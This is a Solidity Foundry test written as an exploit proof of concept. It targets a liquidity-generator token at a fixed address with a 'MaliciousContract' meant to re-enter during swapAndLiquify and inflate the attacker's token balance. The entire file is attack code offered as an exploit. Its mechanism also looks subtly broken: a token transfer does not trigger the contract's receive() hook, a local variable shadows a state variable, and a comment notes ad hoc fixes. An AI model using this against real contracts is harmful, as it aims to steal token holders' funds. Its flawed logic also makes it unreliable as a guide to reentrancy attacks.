pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ILiquidityGeneratorToken {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function swapAndLiquifyEnabled() external view returns (bool);
    function numTokensSellToAddToLiquidity() external view returns (uint256);
}

contract MaliciousContract {
    address public tokenAddress;
    address public attacker;
    bool public entered;

    constructor(address _token) {
        tokenAddress = _token;
        attacker = msg.sender;
    }

    receive() external payable {
        if (!entered) {
            entered = true;
            // Reenter during swap operation
            ILiquidityGeneratorToken(tokenAddress).transfer(attacker, 1000 * 1e9);
        }
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xE2C9C976337357369845c761DD851E2B6942D69f;
    address attacker = address(this);
    ILiquidityGeneratorToken token;
    MaliciousContract malicious;
    uint256 initialBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = ILiquidityGeneratorToken(TARGET);

        // Inject tokens to attacker
        deal(TARGET, address(this), 100000 * 1e9);

        // Deploy malicious contract
        malicious = new MaliciousContract(TARGET);

        // Transfer some tokens to malicious contract to set up
        vm.prank(address(this));
        token.transfer(address(malicious), 50000 * 1e9);

        // Record initial balance
        initialBalance = token.balanceOf(address(this));
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xE2C9C976337357369845c761DD851E2B6942D69f).balanceOf(address(this));
        // Transfer tokens to malicious contract - this should trigger swapAndLiquify
        // and during the swap, the malicious contract will reenter
        vm.prank(address(this));
        token.transfer(address(malicious), 50000 * 1e9);

        // Check final balance - should be greater than initial due to reentrancy
        uint256 finalBalance = token.balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Attacker balance should increase due to reentrancy");

        // Fixed: Renamed variable to avoid redeclaration error
        uint256 finalBalanceERC20 = IERC20(0xE2C9C976337357369845c761DD851E2B6942D69f).balanceOf(address(this));
        assertGt(finalBalanceERC20, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

